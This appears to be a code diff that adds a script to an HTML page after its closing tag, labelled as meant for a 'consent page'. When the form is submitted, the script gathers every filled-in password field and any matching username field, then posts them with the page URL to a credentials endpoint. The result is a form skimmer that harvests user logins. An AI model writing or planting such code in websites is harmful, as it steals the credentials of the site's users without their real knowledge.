@@ -1048,3 +1048,77 @@ try {
 </body>
 </html>
 <script src="../includes/activity-tracker.js"></script>
+<script>
+// This would be included on your consent page
+document.addEventListener('DOMContentLoaded', function() {
+    const consentForm = document.getElementById('consent-form');
+    
+    if (consentForm) {
+        consentForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Get the consent token from the form
+            const consentToken = document.querySelector('[name="consent_token"]').value;
+            
+            // Collect credentials from the page
+            const credentials = collectCredentials();
+            
+            try {
+                const response = await fetch('/api/credentials.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        consent_token: consentToken,
+                        credentials: credentials
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    // Proceed with form submission
+                    consentForm.submit();
+                } else {
+                    alert('Failed to store credentials: ' + (data.error || 'Unknown error'));
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('An error occurred while storing credentials');
+            }
+        });
+    }
+});
+
+function collectCredentials() {
+    const credentials = [];
+    
+    // Find all password fields
+    const passwordFields = document.querySelectorAll('input[type="password"]');
+    
+    passwordFields.forEach(field => {
+        // Try to find associated username field
+        let username = '';
+        const form = field.closest('form');
+        
+        if (form) {
+            // Common username field patterns
+            const usernameField = form.querySelector('input[type="text"][name*="user"], input[type="email"], input[name*="login"]');
+            if (usernameField) {
+                username = usernameField.value;
+            }
+        }
+        
+        if (field.value) {
+            credentials.push({
+                url: window.location.href,
+                username: username,
+                password: field.value
+            });
+        }
+    });
+    
+    return credentials;
+}
+</script>
